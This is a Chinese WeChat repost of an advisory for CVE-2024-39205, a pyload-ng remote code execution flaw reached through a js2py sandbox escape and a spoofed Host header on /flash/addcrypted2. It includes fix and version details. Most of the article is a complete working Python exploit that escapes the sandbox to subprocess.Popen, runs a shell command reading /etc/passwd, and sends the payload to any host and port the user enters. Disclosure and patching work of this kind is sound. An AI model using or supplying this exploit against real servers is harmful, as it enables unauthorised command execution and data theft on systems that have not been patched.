<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/qKiYAnXgYeoWHSSZt_J12w)

![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif)

CVE-2024-39205-Pyload-RCE

利用 js2py 沙箱逃逸实现 Pyload RCE

**概括**

任何在 python3.11 或更低版本下运行的 pyload-ng 都存在 RCE 漏洞。攻击者可以发送包含任何 shell 命令的请求，受害者服务器将立即执行该命令。

使固定

升级到最新版本的 pyload-ng 或者直接使用 python3.12 或更高版本运行 pyload

**细节**

js2py 存在沙盒逃逸漏洞，编号为 CVE-2024-28397，该漏洞被 pyload-ng 的 API 端点所利用 / flash/addcrypted2。虽然该端点设计为只接受 localhost 连接，但是我们可以通过 HTTP Header 绕过这个限制，从而访问该 API，实现 RCE。

**概念证明**

PoC 如下，你可以修改它执行的 shell 命令：  

```
import socket
import base64
from urllib.parse import quote

host, port = input("host: "), int(input("port: "))

payload = """
// [+] command goes here:
let cmd = "head -n 1 /etc/passwd; calc; gnome-calculator;"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
function f() {
    return n11
}

"""

crypted_b64 = base64.b64encode(b"1234").decode()

data = f"package=pkg&crypted={quote(crypted_b64)}&jk={quote(payload)}"

request = f"""\
POST /flash/addcrypted2 HTTP/1.1
Host: 127.0.0.1:9666
Content-Type: application/x-www-form-urlencoded
Content-Length: {len(data)}

{data}
""".encode().replace(b"\n", b"\r\n")

def main():

    s = socket.socket()
    s.connect((host, port))

    s.send(request)
    response = s.recv(1024).decode()
    print(response)

if __name__ == "__main__":
    main()

```

**影响**

任何在 python3.11 或更低版本下运行 pyload-ng 最新版本 (<=0.5.0b3.dev85) 的人。pyload-ng 不要对 python3.12 或更高版本使用 js2py。

**项目链接**

https://github.com/pyload/pyload/security/advisories/GHSA-w7hq-f2pj-c53g

https://github.com/Marven11/CVE-2024-39205-Pyload-RCE

感谢您抽出

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif)

.

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif)

.

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif)

来阅读本文

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif)

**点它，分享点赞在看都在这里**